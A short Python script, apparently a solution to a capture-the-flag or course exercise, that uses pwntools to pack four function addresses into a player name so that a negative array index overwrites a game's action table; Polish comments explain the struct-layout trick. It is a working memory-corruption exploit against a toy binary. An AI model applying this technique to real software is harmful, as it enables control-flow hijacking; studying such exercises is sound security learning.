from pwn import *


generate_boss = str(p32(0x08048af2)) # -4
hit = str(p32(0x0804864b)) # -3
druid_heal = str(p32(0x0804889f)) # -2
warrior_attack = str(p32(0x08048688 )) # -1

#dzieki ponizszemu imieniu (po wypisaniu ��K�����) mamy:
"""
2 - heal 
1 - attack
oraz
-1 - warrior_attack
-2 - druid_heal
-3 - hit
-4 - generate_boss

a gramy wizardem
najpierw wyrownujemy statystyki generate_boss ktory wykona sie na strukturze human 
potem mozemy stworzyc wiecej punktow hit i atakowac warrior_attack

przydalo sie wypisanie adresow
printf("adres imienia struktury player\n");
printf("%p\n\n", &(human.name));

printf("adres -5 akcji \n");
printf("%p\n\n", &(human.actions[-5]));

co uswiadamia ze elementy struktury sa alokowane jeden po drugim
tablica action_t ma typ 4bajtowy wiec &(human.actions[-5]) = &(human.name)
"""

result = generate_boss + hit + druid_heal + warrior_attack


print(result)
